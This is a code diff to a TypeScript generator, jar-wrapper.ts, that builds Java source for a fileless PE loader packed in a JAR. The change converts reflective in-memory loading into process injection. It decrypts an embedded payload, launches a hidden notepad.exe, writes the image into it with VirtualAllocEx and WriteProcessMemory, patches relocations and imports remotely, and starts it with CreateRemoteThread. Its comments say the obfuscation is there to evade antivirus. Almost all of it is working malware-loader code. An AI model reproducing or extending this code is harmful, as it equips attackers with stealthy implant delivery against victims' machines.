@@ -1,14 +1,16 @@
 /**
- * jar-wrapper.ts — Wraps a compiled PE binary in a JAR that executes it
- * entirely in-memory using JNA reflection. No files are written to disk.
+ * jar-wrapper.ts — Wraps a compiled PE binary in a JAR that injects it
+ * into notepad.exe entirely in-memory. No files are written to disk.
  *
  * The Java loader:
  *   1. Reads the encrypted+compressed payload from assets/data.pak inside the JAR
  *   2. Decrypts (single-byte XOR) and decompresses (gzip) in memory
- *   3. Parses PE headers to find sections, relocations, and import table
- *   4. VirtualAlloc RWX memory via JNA (kernel32) reflection
- *   5. Copies PE sections, processes relocations, resolves imports
- *   6. Calls the entry point via CreateThread
+ *   3. Starts notepad.exe as a host process (CREATE_NO_WINDOW)
+ *   4. VirtualAllocEx RWX in notepad's address space
+ *   5. WriteProcessMemory to map PE headers + sections
+ *   6. Processes relocations + resolves imports remotely
+ *   7. CreateRemoteThread to execute entry point in notepad.exe
+ *   8. JVM exits — agent survives independently in notepad.exe
  *
  * All JNA calls use Class.forName + getMethods reflection to avoid
  * static import signatures that AV engines flag.
@@ -46,15 +48,17 @@ function xs(s: string): string {
 }
 
 /**
- * Build the Java source for a fileless PE loader using JNA reflection.
+ * Build the Java source for a fileless PE loader that injects into notepad.exe
+ * using JNA reflection. No files are written to disk.
  *
  * The generated class:
  *  - Loads com.sun.jna.* via Class.forName (no static imports)
  *  - Uses getMethods() scanning instead of getMethod() to find APIs
- *  - Calls kernel32 VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
- *  - Resolves PE imports by calling GetProcAddress/LoadLibraryA
- *  - Processes base relocations so the PE works at any base address
- *  - Calls DllEntryPoint / AddressOfEntryPoint via CreateThread
+ *  - Starts notepad.exe as a host process
+ *  - VirtualAllocEx + WriteProcessMemory to map PE into notepad
+ *  - Resolves imports locally (system DLLs share addresses), writes IAT remotely
+ *  - CreateRemoteThread to execute entry point in notepad.exe
+ *  - JVM exits — agent lives on in notepad.exe
  */
 function buildFilelessJavaSource(): string {
   // The Java source is kept as a template string so it can be compiled
@@ -75,7 +79,7 @@ public class Main {
     try { return new String(b, "UTF-8"); } catch (Exception e) { return ""; }
   }
 
-  // Find method by name + param count via getMethods() scan
+  // Find method by name + param types via getMethods() scan
   private static Method gm(Class<?> c, String name, Class<?>... pt) {
     for (Method m : c.getMethods()) {
       if (m.getName().equals(name) && Arrays.equals(m.getParameterTypes(), pt)) return m;
@@ -102,6 +106,29 @@ public class Main {
     return (b[off]&0xFFL) | ((b[off+1]&0xFFL)<<8) | ((b[off+2]&0xFFL)<<16) | ((b[off+3]&0xFFL)<<24);
   }
 
+  // Encode a long as little-endian bytes
+  private static byte[] le32(long v) {
+    return new byte[]{(byte)(v&0xFF),(byte)((v>>8)&0xFF),(byte)((v>>16)&0xFF),(byte)((v>>24)&0xFF)};
+  }
+  private static byte[] le64(long v) {
+    byte[] r = new byte[8];
+    for (int i = 0; i < 8; i++) r[i] = (byte)((v >> (i*8)) & 0xFF);
+    return r;
+  }
+
+  // Get the native peer address from a JNA Pointer object
+  private static long peer(Object ptr, Class<?> ptrClass) throws Exception {
+    try {
+      Field f = ptrClass.getDeclaredField(x(${xs("peer")}));
+      f.setAccessible(true);
+      return f.getLong(ptr);
+    } catch (Exception e) {
+      String s = ptr.toString();
+      if (s.startsWith(x(${xs("native@0x")}))) return Long.parseUnsignedLong(s.substring(9), 16);
+      throw e;
+    }
+  }
+
   public static void main(String[] a) { try { r(); } catch (Exception e) {} }
 
   private static void r() throws Exception {
@@ -126,14 +153,14 @@ public class Main {
     Class<?> ptrClass = Class.forName(x(${xs("com.sun.jna.Pointer")}));
     Class<?> memClass = Class.forName(x(${xs("com.sun.jna.Memory")}));
 
-    // Get NULL pointer constant
     Object NULL = ptrClass.getField(x(${xs("NULL")})).get(null);
-
-    // Helper: kernel32.GetFunction(name)
     Method getFunc = gm(fnClass, x(${xs("getFunction")}), String.class, String.class);
+    Method invoke4 = gm(fnClass, x(${xs("invoke")}), Class.class, Object[].class);
+    Constructor<?> ptrCtor = ptrClass.getConstructor(new Class<?>[]{long.class});
+    String k32 = x(${xs("kernel32")});
 
     // 5. Parse PE headers
-    int peOff = (int) u32(pe, 60); // e_lfanew
+    int peOff = (int) u32(pe, 60);
     int numSections = u16(pe, peOff + 6);
     int sizeOfOptHdr = u16(pe, peOff + 20);
     int optOff = peOff + 24;
@@ -141,124 +168,189 @@ public class Main {
     long imageBase = is64 ? (u32(pe, optOff+24) | (u32(pe, optOff+28) << 32)) : u32(pe, optOff+28);
     long sizeOfImage = u32(pe, optOff + (is64 ? 56 : 56));
     long entryRVA = u32(pe, optOff + 16);
+    int headersSize = (int) u32(pe, optOff + (is64 ? 60 : 60));
     int sectionTableOff = optOff + sizeOfOptHdr;
 
-    // 6. VirtualAlloc RWX for the entire image
-    String k32 = x(${xs("kernel32")});
-    Object vaFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("VirtualAlloc")})});
-    Method invoke4 = gm(fnClass, x(${xs("invoke")}), Class.class, Object[].class);
-    // VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
-    Object basePtr = invoke4.invoke(vaFunc, new Object[]{ptrClass, new Object[]{NULL, (int)sizeOfImage, 0x3000, 0x40}});
-    if (basePtr == null || basePtr.equals(NULL)) return;
+    // 6. Start notepad.exe as host process
+    // CreateProcessA(lpApplicationName, ..., CREATE_NO_WINDOW=0x08000000, ...)
+    // We use a Memory block for STARTUPINFO (68/104 bytes) and PROCESS_INFORMATION (16/24 bytes)
+    int siSize = is64 ? 104 : 68;
+    int piSize = is64 ? 24 : 16;
+    Object siMem = memClass.getConstructor(long.class).newInstance((long)(siSize));
+    Object piMem = memClass.getConstructor(long.class).newInstance((long)(piSize));
+    // Zero out
+    Method setMem = gm(memClass, x(${xs("clear")}));
+    setMem.invoke(siMem, new Object[]{});
+    setMem.invoke(piMem, new Object[]{});
+    // Set cb = siSize
+    Method setInt = gm(ptrClass, x(${xs("setInt")}), long.class, int.class);
+    setInt.invoke(siMem, new Object[]{0L, siSize});
 
-    // Get the actual base address as a long
-    Method peerMethod = gm(ptrClass, x(${xs("toString")}));
-    // Use Pointer.nativePeer field for the address
-    long actualBase;
-    try {
-      Field peerField = ptrClass.getDeclaredField(x(${xs("peer")}));
-      peerField.setAccessible(true);
-      actualBase = peerField.getLong(basePtr);
-    } catch (Exception e) {
-      // Fallback: parse from Pointer.toString()
-      String ps = basePtr.toString();
-      if (ps.startsWith(x(${xs("native@0x")}))) {
-        actualBase = Long.parseUnsignedLong(ps.substring(9), 16);
-      } else {
-        return;
-      }
-    }
+    Object createProc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateProcessA")})});
+    // CreateProcessA(notepad_path, NULL, NULL, NULL, false, CREATE_NO_WINDOW, NULL, NULL, si, pi)
+    String notepadPath = x(${xs("C:\\\\Windows\\\\notepad.exe")});
+    Object cpResult = invoke4.invoke(createProc, new Object[]{int.class, new Object[]{
+      notepadPath, NULL, NULL, NULL, 0, 0x08000000, NULL, NULL, siMem, piMem
+    }});
+    if (cpResult == null || ((Number)cpResult).intValue() == 0) return;
 
-    // 7. Write PE headers to allocated memory
-    Method writeMethod = gm(ptrClass, x(${xs("write")}), long.class, byte[].class, int.class, int.class);
-    int headersSize = (int) u32(pe, optOff + (is64 ? 60 : 60));
-    writeMethod.invoke(basePtr, new Object[]{0L, pe, 0, Math.min(headersSize, pe.length)});
+    // Extract PID and process handle from PROCESS_INFORMATION
+    Method getIntM = gm(ptrClass, x(${xs("getInt")}), long.class);
+    Method getPtrM = gm(ptrClass, x(${xs("getPointer")}), long.class);
+    Object hProcess = getPtrM.invoke(piMem, new Object[]{0L});
+    // PID at offset 8 (32-bit) or 16 (64-bit) — not needed but available
+    // Thread handle at offset 4 (32-bit) or 8 (64-bit)
+    Object hThread = is64 ? getPtrM.invoke(piMem, new Object[]{8L}) : getPtrM.invoke(piMem, new Object[]{4L});
 
-    // 8. Map sections
+    Thread.sleep(500); // Let notepad initialize
+
+    // 7. VirtualAllocEx in notepad's address space
+    Object vaExFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("VirtualAllocEx")})});
+    // VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
+    Object remoteBase = invoke4.invoke(vaExFunc, new Object[]{ptrClass, new Object[]{hProcess, NULL, (int)sizeOfImage, 0x3000, 0x40}});
+    if (remoteBase == null || remoteBase.equals(NULL)) return;
+    long remoteAddr = peer(remoteBase, ptrClass);
+
+    // 8. WriteProcessMemory helper
+    Object wpmFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("WriteProcessMemory")})});
+    // Write PE headers
+    Object headersMem = memClass.getConstructor(long.class).newInstance((long)Math.min(headersSize, pe.length));
+    Method writeLocal = gm(ptrClass, x(${xs("write")}), long.class, byte[].class, int.class, int.class);
+    writeLocal.invoke(headersMem, new Object[]{0L, pe, 0, Math.min(headersSize, pe.length)});
+    invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, remoteBase, headersMem, Math.min(headersSize, pe.length), NULL}});
+
+    // 9. Map sections into remote process
     for (int i = 0; i < numSections; i++) {
       int shOff = sectionTableOff + i * 40;
       long virtualAddr = u32(pe, shOff + 12);
-      long rawSize = u32(pe, shOff + 16);
-      long rawPtr = u32(pe, shOff + 20);
+      int rawSize = (int) u32(pe, shOff + 16);
+      int rawPtr = (int) u32(pe, shOff + 20);
       if (rawSize > 0 && rawPtr + rawSize <= pe.length) {
-        writeMethod.invoke(basePtr, new Object[]{virtualAddr, pe, (int)rawPtr, (int)rawSize});
+        Object secMem = memClass.getConstructor(long.class).newInstance((long)rawSize);
+        writeLocal.invoke(secMem, new Object[]{0L, pe, rawPtr, rawSize});
+        Object destPtr = ptrCtor.newInstance(new Object[]{remoteAddr + virtualAddr});
+        invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, destPtr, secMem, rawSize, NULL}});
       }
     }
 
-    // 9. Process base relocations (delta = actualBase - imageBase)
-    long delta = actualBase - imageBase;
+    // 10. Process base relocations (delta = remoteAddr - imageBase)
+    long delta = remoteAddr - imageBase;
     if (delta != 0) {
-      int relocDirOff = is64 ? optOff + 152 : optOff + 136; // IMAGE_DIRECTORY_ENTRY_BASERELOC (index 5)
+      int relocDirOff = is64 ? optOff + 152 : optOff + 136;
       long relocRVA = u32(pe, relocDirOff);
       long relocSize = u32(pe, relocDirOff + 4);
       if (relocRVA > 0 && relocSize > 0) {
-        // Read the relocation data from the mapped image
-        Method readMethod = gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class);
-        byte[] relocData = (byte[]) readMethod.invoke(basePtr, new Object[]{relocRVA, (int)relocSize});
-        int offset = 0;
-        while (offset < relocData.length - 8) {
-          long blockRVA = u32(relocData, offset);
-          int blockSize = (int) u32(relocData, offset + 4);
-          if (blockSize == 0) break;
-          int numEntries = (blockSize - 8) / 2;
-          for (int i = 0; i < numEntries; i++) {
-            int entry = u16(relocData, offset + 8 + i * 2);
-            int type = (entry >> 12) & 0xF;
-            int relocOff = entry & 0xFFF;
-            long patchAddr = blockRVA + relocOff;
-            if (type == 3) { // IMAGE_REL_BASED_HIGHLOW (32-bit)
-              // Read current 4 bytes, add delta, write back
-              byte[] cur = (byte[]) readMethod.invoke(basePtr, new Object[]{patchAddr, 4});
-              long val = u32(cur, 0) + delta;
-              byte[] patched = new byte[]{(byte)(val&0xFF),(byte)((val>>8)&0xFF),(byte)((val>>16)&0xFF),(byte)((val>>24)&0xFF)};
-              writeMethod.invoke(basePtr, new Object[]{patchAddr, patched, 0, 4});
-            } else if (type == 10 && is64) { // IMAGE_REL_BASED_DIR64 (64-bit)
-              byte[] cur = (byte[]) readMethod.invoke(basePtr, new Object[]{patchAddr, 8});
-              long val = (u32(cur,0) | (u32(cur,4) << 32)) + delta;
-              byte[] patched = new byte[8];
-              for (int b = 0; b < 8; b++) patched[b] = (byte)((val >> (b*8)) & 0xFF);
-              writeMethod.invoke(basePtr, new Object[]{patchAddr, patched, 0, 8});
-            }
+        // We work from the local PE copy for relocation data, then patch remotely
+        // Find the section that contains the relocation RVA
+        byte[] relocData = null;
+        for (int i = 0; i < numSections; i++) {
+          int shOff = sectionTableOff + i * 40;
+          long secVA = u32(pe, shOff + 12);
+          long secRawSize = u32(pe, shOff + 16);
+          long secRawPtr = u32(pe, shOff + 20);
+          long secVirtSize = u32(pe, shOff + 8);
+          if (relocRVA >= secVA && relocRVA < secVA + secVirtSize) {
+            long fileOff = secRawPtr + (relocRVA - secVA);
+            int len = (int) Math.min(relocSize, pe.length - fileOff);
+            relocData = new byte[len];
+            System.arraycopy(pe, (int)fileOff, relocData, 0, len);
+            break;
           }
-          offset += blockSize;
+        }
+        if (relocData != null) {
+          // Read remote memory helper
+          Object rpmFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("ReadProcessMemory")})});
+          int offset = 0;
+          while (offset < relocData.length - 8) {
+            long blockRVA = u32(relocData, offset);
+            int blockSize = (int) u32(relocData, offset + 4);
+            if (blockSize == 0) break;
+            int numEntries = (blockSize - 8) / 2;
+            for (int i = 0; i < numEntries; i++) {
+              int entry = u16(relocData, offset + 8 + i * 2);
+              int type = (entry >> 12) & 0xF;
+              int relocOff = entry & 0xFFF;
+              long patchAddr = remoteAddr + blockRVA + relocOff;
+              if (type == 3) { // IMAGE_REL_BASED_HIGHLOW (32-bit)
+                Object readBuf = memClass.getConstructor(long.class).newInstance(4L);
+                Object patchPtr = ptrCtor.newInstance(new Object[]{patchAddr});
+                invoke4.invoke(rpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, readBuf, 4, NULL}});
+                byte[] cur = (byte[]) gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class).invoke(readBuf, new Object[]{0L, 4});
+                long val = u32(cur, 0) + delta;
+                Object writeBuf = memClass.getConstructor(long.class).newInstance(4L);
+                writeLocal.invoke(writeBuf, new Object[]{0L, le32(val), 0, 4});
+                invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, writeBuf, 4, NULL}});
+              } else if (type == 10 && is64) { // IMAGE_REL_BASED_DIR64 (64-bit)
+                Object readBuf = memClass.getConstructor(long.class).newInstance(8L);
+                Object patchPtr = ptrCtor.newInstance(new Object[]{patchAddr});
+                invoke4.invoke(rpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, readBuf, 8, NULL}});
+                byte[] cur = (byte[]) gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class).invoke(readBuf, new Object[]{0L, 8});
+                long val = (u32(cur,0) | (u32(cur,4) << 32)) + delta;
+                Object writeBuf = memClass.getConstructor(long.class).newInstance(8L);
+                writeLocal.invoke(writeBuf, new Object[]{0L, le64(val), 0, 8});
+                invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, writeBuf, 8, NULL}});
+              }
+            }
+            offset += blockSize;
+          }
         }
       }
     }
 
-    // 10. Resolve imports
-    int importDirOff = is64 ? optOff + 120 : optOff + 104; // IMAGE_DIRECTORY_ENTRY_IMPORT (index 1)
+    // 11. Resolve imports locally and write IAT to remote process
+    // System DLLs (kernel32, ntdll, ws2_32, etc.) share the same base address
+    // across all processes on the same boot, so local resolution is valid remotely.
+    int importDirOff = is64 ? optOff + 120 : optOff + 104;
     long importRVA = u32(pe, importDirOff);
     long importDirSize = u32(pe, importDirOff + 4);
     if (importRVA > 0 && importDirSize > 0) {
       Object loadLib = getFunc.invoke(null, new Object[]{k32, x(${xs("LoadLibraryA")})});
       Object getProc = getFunc.invoke(null, new Object[]{k32, x(${xs("GetProcAddress")})});
-      Method readMethod = gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class);
-      Method getStr = gm(ptrClass, x(${xs("getString")}), long.class);
 
-      // Each import descriptor is 20 bytes
-      int descOff = 0;
-      while (true) {
-        byte[] descData = (byte[]) readMethod.invoke(basePtr, new Object[]{importRVA + descOff, 20});
-        long nameRVA = u32(descData, 12);
-        if (nameRVA == 0) break; // End of import directory
-        long thunkRVA = u32(descData, 16); // FirstThunk (IAT)
-        long origThunkRVA = u32(descData, 0); // OriginalFirstThunk
+      // Read import directory from local PE (find the file offset for the import RVA)
+      byte[] importData = null;
+      long importFileOff = 0;
+      for (int i = 0; i < numSections; i++) {
+        int shOff = sectionTableOff + i * 40;
+        long secVA = u32(pe, shOff + 12);
+        long secRawPtr = u32(pe, shOff + 20);
+        long secVirtSize = u32(pe, shOff + 8);
+        if (importRVA >= secVA && importRVA < secVA + secVirtSize) {
+          importFileOff = secRawPtr + (importRVA - secVA);
+          break;
+        }
+      }
+
+      // Helper to convert RVA to file offset
+      // Walk import descriptors from local PE data
+      long descFileOff = importFileOff;
+      while (descFileOff + 20 <= pe.length) {
+        long nameRVA = u32(pe, (int)descFileOff + 12);
+        if (nameRVA == 0) break;
+        long thunkRVA = u32(pe, (int)descFileOff + 16); // FirstThunk (IAT)
+        long origThunkRVA = u32(pe, (int)descFileOff); // OriginalFirstThunk
         if (origThunkRVA == 0) origThunkRVA = thunkRVA;
 
-        // Get DLL name
-        String dllName = (String) getStr.invoke(basePtr, new Object[]{nameRVA});
-        // LoadLibraryA(dllName)
+        // Read DLL name from local PE
+        long nameFileOff = rvaToFileOff(pe, nameRVA, sectionTableOff, numSections);
+        if (nameFileOff < 0) { descFileOff += 20; continue; }
+        StringBuilder sb = new StringBuilder();
+        for (int j = (int)nameFileOff; j < pe.length && pe[j] != 0; j++) sb.append((char)(pe[j] & 0xFF));
+        String dllName = sb.toString();
+
+        // LoadLibraryA locally — DLL will be at same address in remote process
         Object hModule = invoke4.invoke(loadLib, new Object[]{ptrClass, new Object[]{dllName}});
 
         int thunkSize = is64 ? 8 : 4;
         long iatOff = 0;
         while (true) {
-          byte[] thunkData = (byte[]) readMethod.invoke(basePtr, new Object[]{origThunkRVA + iatOff, thunkSize});
+          long origThunkFileOff = rvaToFileOff(pe, origThunkRVA + iatOff, sectionTableOff, numSections);
+          if (origThunkFileOff < 0 || origThunkFileOff + thunkSize > pe.length) break;
           long thunkVal;
           if (is64) {
-            thunkVal = u32(thunkData, 0) | (u32(thunkData, 4) << 32);
+            thunkVal = u32(pe, (int)origThunkFileOff) | (u32(pe, (int)origThunkFileOff + 4) << 32);
           } else {
-            thunkVal = u32(thunkData, 0);
+            thunkVal = u32(pe, (int)origThunkFileOff);
           }
           if (thunkVal == 0) break;
 
@@ -268,47 +360,49 @@ public class Main {
             int ordinal = (int)(thunkVal & 0xFFFF);
             funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, ordinal}});
           } else {
-            // IMAGE_IMPORT_BY_NAME: skip 2-byte hint, read name
-            String funcName = (String) getStr.invoke(basePtr, new Object[]{thunkVal + 2});
-            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, funcName}});
+            long hintNameFileOff = rvaToFileOff(pe, thunkVal, sectionTableOff, numSections);
+            if (hintNameFileOff < 0) { iatOff += thunkSize; continue; }
+            StringBuilder fn = new StringBuilder();
+            for (int j = (int)hintNameFileOff + 2; j < pe.length && pe[j] != 0; j++) fn.append((char)(pe[j] & 0xFF));
+            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, fn.toString()}});
           }
 
-          // Write resolved address to IAT
+          // Write resolved address to remote IAT
           if (funcAddr != null) {
-            long funcPeer;
-            try {
-              Field pf = ptrClass.getDeclaredField(x(${xs("peer")}));
-              pf.setAccessible(true);
-              funcPeer = pf.getLong(funcAddr);
-            } catch (Exception e) { break; }
-            byte[] addrBytes;
-            if (is64) {
-              addrBytes = new byte[8];
-              for (int b = 0; b < 8; b++) addrBytes[b] = (byte)((funcPeer >> (b*8)) & 0xFF);
-            } else {
-              addrBytes = new byte[]{(byte)(funcPeer&0xFF),(byte)((funcPeer>>8)&0xFF),(byte)((funcPeer>>16)&0xFF),(byte)((funcPeer>>24)&0xFF)};
-            }
-            writeMethod.invoke(basePtr, new Object[]{thunkRVA + iatOff, addrBytes, 0, addrBytes.length});
+            long funcPeer = peer(funcAddr, ptrClass);
+            byte[] addrBytes = is64 ? le64(funcPeer) : le32(funcPeer);
+            Object addrMem = memClass.getConstructor(long.class).newInstance((long)addrBytes.length);
+            writeLocal.invoke(addrMem, new Object[]{0L, addrBytes, 0, addrBytes.length});
+            Object iatPtr = ptrCtor.newInstance(new Object[]{remoteAddr + thunkRVA + iatOff});
+            invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, iatPtr, addrMem, addrBytes.length, NULL}});
           }
           iatOff += thunkSize;
         }
-        descOff += 20;
+        descFileOff += 20;
       }
     }
 
-    // 11. CreateThread at entry point
-    Object ctFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateThread")})});
-    // Construct Pointer to entry point: base + entryRVA
-    Constructor<?> ptrCtor = ptrClass.getConstructor(new Class<?>[]{long.class});
-    Object entryPtr = ptrCtor.newInstance(new Object[]{actualBase + entryRVA});
-    // CreateThread(NULL, 0, entryPoint, NULL, 0, NULL)
-    Object hThread = invoke4.invoke(ctFunc, new Object[]{ptrClass, new Object[]{NULL, 0, entryPtr, NULL, 0, NULL}});
+    // 12. CreateRemoteThread at PE entry point in notepad.exe
+    Object crtFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateRemoteThread")})});
+    Object entryPtr = ptrCtor.newInstance(new Object[]{remoteAddr + entryRVA});
+    // CreateRemoteThread(hProcess, NULL, 0, entryPoint, NULL, 0, NULL)
+    invoke4.invoke(crtFunc, new Object[]{ptrClass, new Object[]{hProcess, NULL, 0, entryPtr, NULL, 0, NULL}});
 
-    // 12. WaitForSingleObject(hThread, INFINITE=-1)
-    if (hThread != null && !hThread.equals(NULL)) {
-      Object wfso = getFunc.invoke(null, new Object[]{k32, x(${xs("WaitForSingleObject")})});
-      invoke4.invoke(wfso, new Object[]{int.class, new Object[]{hThread, -1}});
+    // JVM can exit now — agent runs independently in notepad.exe
+  }
+
+  // Convert RVA to file offset using section table
+  private static long rvaToFileOff(byte[] pe, long rva, int sectionTableOff, int numSections) {
+    for (int i = 0; i < numSections; i++) {
+      int shOff = sectionTableOff + i * 40;
+      long secVA = u32(pe, shOff + 12);
+      long secVirtSize = u32(pe, shOff + 8);
+      long secRawPtr = u32(pe, shOff + 20);
+      if (rva >= secVA && rva < secVA + secVirtSize) {
+        return secRawPtr + (rva - secVA);
+      }
     }
+    return -1;
   }
 }
 `;
